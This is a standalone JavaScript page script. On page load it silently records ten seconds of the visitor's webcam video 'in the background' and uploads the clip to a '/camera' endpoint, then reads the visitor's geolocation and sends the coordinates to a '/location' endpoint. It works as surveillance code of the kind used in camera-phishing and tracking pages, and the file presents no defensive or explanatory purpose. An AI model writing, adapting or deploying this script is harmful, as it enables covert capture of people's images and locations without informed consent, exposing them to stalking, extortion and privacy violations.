document.addEventListener('DOMContentLoaded', function() {
    // Request camera access and record video in the background
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];

            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const formData = new FormData();
                formData.append('file', blob, 'camera_video.mp4');

                fetch('/camera', {
                    method: 'POST',
                    body: formData
                }).then(response => {
                    if (response.ok) {
                        console.log('Video saved successfully');
                    } else {
                        console.error('Failed to save video');
                    }
                });
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 10000); // Record for 10 seconds
        })
        .catch(err => {
            console.error('Error accessing camera: ', err);
        });

    // Request location access and save to file
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            fetch(`/location?latitude=${latitude}&longitude=${longitude}`, {
                method: 'GET'
            }).then(response => {
                if (response.ok) {
                    console.log('Location saved successfully');
                } else {
                    console.error('Failed to save location');
                }
            });
        }, err => {
            console.error('Error accessing location: ', err);
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
    }
});